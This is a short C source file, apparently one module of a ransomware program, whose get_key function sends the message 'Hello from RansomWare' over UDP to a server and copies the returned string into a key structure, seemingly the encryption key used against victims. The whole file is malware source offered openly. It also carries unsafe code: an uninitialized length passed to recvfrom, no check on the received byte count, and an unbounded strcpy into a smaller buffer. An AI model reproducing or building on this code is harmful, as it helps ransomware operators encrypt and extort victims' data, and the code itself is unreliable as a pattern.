#include "../includes/get_key.h"

int get_key(clef_t **key) {
	int                sockfd = 0;
	struct sockaddr_in servaddr;
	char               buffer[1024]; 
    char              *hello = "Hello from RansomWare";
    int                n;
    int                len;

	if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        return _ERROR_CANT_CREAT_SOCKET_;
    }
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(POST_SRV);
    servaddr.sin_addr.s_addr = INADDR_ANY;
    sendto(sockfd, (const char *)hello, strlen(hello), 0, (const struct sockaddr *) &servaddr, sizeof(servaddr));
    n = recvfrom(sockfd, (char *)buffer, 1024, MSG_WAITALL, (struct sockaddr *)&servaddr, &len);
    buffer[n] = '\0';
    close(sockfd);

    (*key) = malloc(sizeof(clef_t));
    memset((*key)->key, 0, sizeof(char)*501);
    strcpy((*key)->key, buffer);

    return 0;
}